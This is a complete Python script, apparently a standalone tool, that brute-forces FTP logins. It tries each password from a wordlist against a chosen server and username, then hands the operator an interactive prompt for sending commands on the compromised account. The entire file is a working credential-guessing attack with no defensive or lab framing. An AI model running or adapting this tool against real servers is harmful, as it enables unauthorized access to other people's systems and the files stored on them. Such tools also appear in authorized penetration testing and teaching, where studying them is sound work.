import ftplib
import argparse
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

def ftp_bruteforce(username, password_list, target, port):
    try:
        with open(password_list, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(Fore.RED + "[!] Password list file not found.")
        return

    for password in passwords:
        password = password.strip()
        print(Fore.YELLOW + f"Trying Passphrase: \"{password}\"")

        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=5)
            ftp.login(username, password)
            print(Fore.GREEN + f"KEY FOUND: [ \"{password}\" ]")
            interactive_ftp(ftp)  # Call the function to interact with the FTP server
            ftp.quit()
            return
        except ftplib.error_perm:
            continue
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
            return

    print(Fore.RED + "KEY NOT FOUND")

def interactive_ftp(ftp):
    print(Fore.CYAN + "[*] Successfully logged in! You can now execute FTP commands.")
    print(Fore.CYAN + "[*] Type 'exit' to logout.")

    while True:
        command = input(Fore.YELLOW + "ftp> ")

        if command.lower() == "exit":
            print(Fore.CYAN + "[*] Logging out.")
            break

        try:
            # Send the command to the FTP server
            response = ftp.sendcmd(command)
            print(Fore.GREEN + response)
        except ftplib.error_perm as e:
            print(Fore.RED + f"[!] Permission Error: {e}")
        except ftplib.error_temp as e:
            print(Fore.RED + f"[!] Temporary Error: {e}")
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="FTP Bruteforcer")
    parser.add_argument("-l", "--login", required=True, help="Username for FTP login")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to password list file")
    parser.add_argument("ftp_url", help="Target FTP server in format ftp://<target-ip>:port")

    args = parser.parse_args()

    # Extract target IP and port
    if args.ftp_url.startswith("ftp://"):
        target_info = args.ftp_url[6:].split(":")
        if len(target_info) != 2:
            print(Fore.RED + "[!] Invalid FTP URL format. Use ftp://<target-ip>:port")
            exit(1)
        target_ip, port = target_info
        try:
            port = int(port)
        except ValueError:
            print(Fore.RED + "[!] Invalid port number.")
            exit(1)
    else:
        print(Fore.RED + "[!] Invalid FTP URL format. Use ftp://<target-ip>:port")
        exit(1)

    ftp_bruteforce(args.login, args.passwordlist, target_ip, port)
